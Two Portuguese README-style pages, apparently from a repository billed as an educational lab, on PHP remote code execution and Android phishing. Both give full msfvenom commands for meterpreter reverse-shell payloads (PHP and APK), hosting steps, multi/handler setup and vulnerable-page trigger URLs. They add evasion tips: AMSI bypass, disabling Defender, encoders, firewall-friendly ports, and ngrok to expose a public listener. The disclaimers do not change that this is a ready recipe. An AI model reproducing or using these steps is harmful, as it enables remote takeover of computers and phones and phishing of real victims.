<h1>PHP RCE Lab Demo – Apenas para Estudo Educacional</h1>

<div class="badge badge-red">APENAS EDUCACIONAL</div>
<div class="badge badge-orange">AVISO LEGAL – CRIME SE USADO SEM AUTORIZAÇÃO</div>

<div class="warning">
    <strong>AVISO LEGAL OBRIGATÓRIO – LEIA ANTES DE USAR</strong><br><br>
    Este repositório é <strong>exclusivamente educacional</strong> e destinado apenas a <strong>estudo e pesquisa em ambiente controlado</strong>.<br><br>
    Deve ser usado <strong>somente</strong> em máquinas virtuais isoladas que você controla 100% (rede host-only ou NAT sem acesso à internet real ou a redes de terceiros).<br><br>
    Qualquer uso em sistemas sem autorização expressa e <strong>por escrito</strong> constitui crime grave no Brasil:<br>
    • Art. 154-A do Código Penal (invasão de dispositivo informático)<br>
    • Lei nº 14.155/2021 (Lei Carolina Dieckmann)<br>
    • LGPD e demais legislações aplicáveis<br><br>
    O autor <strong>não</strong> se responsabiliza por qualquer uso indevido ou consequência decorrente deste material.
</div>

<h2>Objetivo deste repositório</h2>
<p>Demonstrar de forma <strong>controlada e didática</strong>:</p>
<ul>
    <li>Como uma vulnerabilidade RCE (Remote Code Execution) funciona em PHP</li>
    <li>Como payloads stageless do Metasploit (ex: <code>php/meterpreter_reverse_https</code>) são entregues via RCE</li>
    <li>Limitações reais de detecção em 2026 (AMSI, Windows Defender, EDRs como CrowdStrike/SentinelOne)</li>
</ul>
<p><strong>Este repositório NÃO é um exploit pronto para uso real. É apenas material de aprendizado.</strong></p>

<h2>Ambiente Recomendado (obrigatório para uso seguro)</h2>
<ul>
    <li><strong>Atacante</strong>: VM Kali Linux / Parrot OS</li>
    <li><strong>Vítima</strong>: VM Windows 10/11 ou Linux com XAMPP / Apache + PHP</li>
    <li><strong>Rede</strong>: Host-Only ou NAT isolada (sem internet no alvo)</li>
    <li><strong>Isolamento</strong>: Nunca conecte essas VMs à rede real ou a máquinas de terceiros</li>
</ul>

<h2>Passo a passo – Como usar (apenas lab isolado)</h2>

<h3>1. Gere o payload stageless (no atacante)</h3>
<pre><code>msfvenom -p php/meterpreter_reverse_https \
  LHOST=192.168.56.101 \
  LPORT=443 \
  -f raw > meter.php</code></pre>

<h3>2. Hospede o payload temporariamente</h3>
<pre><code>cd pasta-onde-esta-o-meter.php
python3 -m http.server 8000</code></pre>

<h3>3. Inicie o handler no msfconsole (antes de acessar a página)</h3>
<pre><code>msfconsole -q -x "
use multi/handler;
set payload php/meterpreter_reverse_https;
set LHOST 192.168.56.101;
set LPORT 443;
set ExitOnSession false;
exploit -j
"</code></pre>

<h3>4. Copie o arquivo <code>vulnerable.php</code> para a VM vítima</h3>
<p>Coloque em <code>htdocs/vulnerable.php</code> (XAMPP) ou pasta do Apache</p>

<h3>5. Acesse e teste</h3>
<pre><code>http://ip-da-vitima/vulnerable.php?payload=1
http://ip-da-vitima/vulnerable.php?cmd=whoami&debug=1
http://ip-da-vitima/vulnerable.php?cmd=ipconfig&debug=1</code></pre>

<h2>Limitações reais em 2026</h2>
<table>
    <thead>
        <tr>
            <th>Proteção</th>
            <th>Chance de sucesso em ambiente protegido</th>
            <th>Comentário</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Windows Defender + AMSI (padrão)</td>
            <td>5–25%</td>
            <td>Detecta eval() + base64 de payloads Metasploit</td>
        </tr>
        <tr>
            <td>Defender + Cloud Protection</td>
            <td>< 10%</td>
            <td>Bloqueia na nuvem antes da execução</td>
        </tr>
        <tr>
            <td>EDR (CrowdStrike, SentinelOne, etc.)</td>
            <td>< 5%</td>
            <td>Detecta comportamento de reverse shell</td>
        </tr>
        <tr>
            <td>Instalação silenciosa (.exe/.apk)</td>
            <td>Quase 0%</td>
            <td>Exige interação do usuário ou 0-day</td>
        </tr>
    </tbody>
</table>

<h2>Recomendações de Segurança (obrigatórias)</h2>
<ul>
    <li>Desative <strong>apenas no lab</strong>: Windows Defender real-time, AMSI (via PowerShell bypass clássico – use com cuidado)</li>
    <li>Nunca exponha este código em servidor real, VPS, hospedagem compartilhada ou qualquer IP público</li>
    <li>Use sempre VMs descartáveis e isoladas</li>
    <li>Documente tudo que for detectado (prints do Defender, logs do EDR)</li>
</ul>

<h2>Licença</h2>
<p>MIT License – mas com a <strong>ressalva explícita</strong> de que o uso indevido é de responsabilidade <strong>exclusiva</strong> do usuário.</p>

<h2>Próximos passos sugeridos (para estudo)</h2>
<ul>
    <li>Testar em duas VMs isoladas (Kali + Windows 11 24H2)</li>
    <li>Tentar AMSI bypass básico via PowerShell antes do payload</li>
    <li>Registrar detecções do Windows Defender (capturas de tela)</li>
    <li>Comparar <code>reverse_tcp</code> vs <code>reverse_https</code></li>
    <li>Testar portas comuns (80, 443, 53) para evasão de firewall</li>
    <li>Experimentar encoders no msfvenom (<code>-e php/base64</code>, múltiplos encoders)</li>
    <li>Documentar o que funciona / não funciona em 2026</li>
</ul>

<footer>
    <p style="text-align:center; margin-top:4rem; color:#6c757d;">
        Boa sorte nos estudos — <strong>mantenha tudo 100% isolado</strong>.<br>
        Feito para aprendizado responsável.
    </p>
</footer>








<h1>PHP RCE + Phishing Mobile Lab (Android Payload) – Apenas Estudo Isolado</h1>

<div class="warning">
    <strong>AVISO LEGAL OBRIGATÓRIO</strong><br><br>
    Este material é <strong>exclusivamente educacional</strong> e deve ser usado <strong>somente</strong> em VMs isoladas controladas por você.<br><br>
    Qualquer uso em sistemas reais sem autorização por escrito é crime grave no Brasil (art. 154-A CP + Lei 14.155/2021).<br><br>
    O autor NÃO se responsabiliza por mau uso.
</div>

<h2>Objetivo</h2>
<p>Simular RCE em PHP + phishing para celular Android via APK com payload Meterpreter (para estudo/CTF/lab isolado).</p>

<h2>Como usar (apenas lab isolado)</h2>

<div class="steps">
    <h3>1. Gere o payload APK (no atacante – Kali/Parrot)</h3>
    <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 R > payload.apk</code></pre>

    <h3>2. Hospede o APK</h3>
    <pre><code>python3 -m http.server 8000</code></pre>

    <h3>3. Inicie o handler</h3>
    <pre><code>msfconsole
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST seu.ip
set LPORT 4444
exploit -j</code></pre>

    <h3>4. Acesse a página PHP no celular/emulador</h3>
    <pre><code>http://SEU_IP/vulnerable-mobile.php</code></pre>
    <p>Baixe e instale o APK (ative "Fontes desconhecidas" nas configs do Android).</p>

    <h3>5. Teste RCE (opcional)</h3>
    <pre><code>?cmd=id
?cmd=whoami</code></pre>
</div>

<h2>Limitações reais em 2026</h2>
<ul>
    <li>Android moderno (13+) bloqueia instalação de APKs desconhecidos por padrão</li>
    <li>Google Play Protect detecta payloads Metasploit em segundos</li>
    <li>Para CTF/lab: use emulador com Play Protect off</li>
    <li>iOS: impossível sem jailbreak (não suportado aqui)</li>
</ul>

<h2>Próximos passos para estudo</h2>
<ul>
    <li>Teste em emulador Android (Android Studio)</li>
    <li>Use ngrok para LHOST público (ngrok tcp 4444)</li>
    <li>Analise detecção do Play Protect</li>
    <li>Documente prints do handler pegando sessão</li>
</ul>

<footer>
    Boa sorte nos estudos/CTF — mantenha 100% isolado!<br>
    Feito para aprendizado responsável.
</footer>
